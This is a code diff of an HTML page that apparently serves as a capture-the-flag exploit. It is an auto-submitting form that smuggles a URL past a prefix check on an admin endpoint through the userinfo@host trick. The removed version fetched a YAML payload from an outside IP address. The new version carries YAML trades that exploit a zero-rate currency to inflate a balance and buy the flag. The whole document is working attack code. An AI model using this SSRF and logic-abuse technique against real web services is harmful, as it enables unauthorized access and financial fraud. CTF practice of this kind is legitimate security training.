@@ -1,19 +1,32 @@
 <!doctype html>
-<html>
-<head><meta charset="utf-8"><title>CTF Auto-POST</title></head>
-<body>
-  <form id="f" method="POST" action="http://localhost:5000/admin.php">
-    <input type="hidden" name="url" id="u">
-  </form>
-  <script>
-    // IMPORTANT: this string must START with the exact URL_PREFIX, then use userinfo@host SSRF.
-    // Example final URL:
-    //   http://localhost:5000/admin.php@YOUR_HOST_AND_PATH
-    const payloadHostPath = "75.119.143.38:8001/x.yaml"; // e.g. raw.githubusercontent.com/user/repo/branch/payload.yaml
-    const evilUrl = "http://localhost:5000/admin.php@" + payloadHostPath;
+<meta charset="utf-8">
+<title>ctf exploit</title>
+<form id="f" method="post" action="http://localhost:5000/admin.php">
+  <input type="hidden" name="url" id="url">
+</form>
+<script>
+// Construct a list of transactions:
+// 1) Buy 1,000,000 units of an unknown currency (rate 0 → cost 0)
+// 2) Sell the same amount of that currency (credits balance)
+// 3) Buy 1 unit of FL (costs 1,000,000, which we now have)
+const yaml =
+  '- amount: 1000000\n' +
+  '  currency: ZZZ\n' +
+  '  op: BUY\n' +
+  '- amount: 1000000\n' +
+  '  currency: ZZZ\n' +
+  '  op: SELL\n' +
+  '- amount: 1\n' +
+  '  currency: FL\n' +
+  '  op: BUY';
 
-    document.getElementById("u").value = evilUrl;
-    document.getElementById("f").submit();
-  </script>
-</body>
-</html>
+// Encode the YAML for /index.php?html=...
+const encodedYaml = encodeURIComponent(yaml);
+
+// Build the smuggled URL: it begins with the required prefix but actually points at our YAML on /index.php
+const smuggle = 'http://localhost:5000/admin.php@localhost:5000/index.php?html=' + encodedYaml;
+
+// Populate the hidden input and submit
+document.getElementById('url').value = smuggle;
+document.getElementById('f').submit();
+</script>
